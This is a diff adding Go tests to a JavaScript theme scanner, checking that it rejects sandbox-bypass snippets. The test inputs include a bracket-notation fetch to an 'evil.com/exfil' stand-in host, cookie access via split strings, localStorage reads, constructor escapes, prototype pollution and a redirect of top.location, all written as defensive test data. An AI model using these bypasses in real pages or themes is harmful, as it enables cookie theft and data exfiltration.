@@ -147,6 +147,71 @@ func TestScan_ElementPrototype_Blocked(t *testing.T) {
 	}
 }
 
+// Bypass attempts that the original literal-only scanner missed.
+
+func TestScan_BracketNotation_FetchBlocked(t *testing.T) {
+	src := []byte(`window["fetch"]("https://evil.com/exfil");`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for window[\"fetch\"] bracket access")
+	}
+}
+
+func TestScan_GlobalThis_FetchBlocked(t *testing.T) {
+	src := []byte(`globalThis.fetch("https://evil.com");`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for globalThis.fetch bypass")
+	}
+}
+
+func TestScan_Reflect_GetBlocked(t *testing.T) {
+	src := []byte(`var f = Reflect.get(window, "fetch"); f("/");`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for Reflect.get global escape")
+	}
+}
+
+func TestScan_ConstructorConstructor_Blocked(t *testing.T) {
+	src := []byte(`([]).constructor.constructor("return fetch")();`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for constructor.constructor escape")
+	}
+}
+
+func TestScan_BracketLocalStorage_Blocked(t *testing.T) {
+	src := []byte(`var t = window['localStorage'].getItem('x');`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for window['localStorage'] bracket access")
+	}
+}
+
+func TestScan_DocumentBracket_Blocked(t *testing.T) {
+	src := []byte(`document["coo"+"kie"];`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for document[..] bracket bypass")
+	}
+}
+
+func TestScan_NewFunctionAliased_Blocked(t *testing.T) {
+	src := []byte(`var F = self.Function; new F("alert(1)")();`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for new Function via alias")
+	}
+}
+
+func TestScan_ObjectPrototypePollution_Blocked(t *testing.T) {
+	src := []byte(`Object.prototype.hacked = true;`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for Object.prototype write")
+	}
+}
+
+func TestScan_WindowAssignment_Blocked(t *testing.T) {
+	src := []byte(`top.location = "https://evil.com";`)
+	if err, _ := Scan(src); err == nil {
+		t.Error("expected error for top.location assignment")
+	}
+}
+
 func TestScan_OnlyEveyAPIAllowed(t *testing.T) {
 	// Full realistic theme that only uses the evey.theme.* API.
 	src := []byte(`
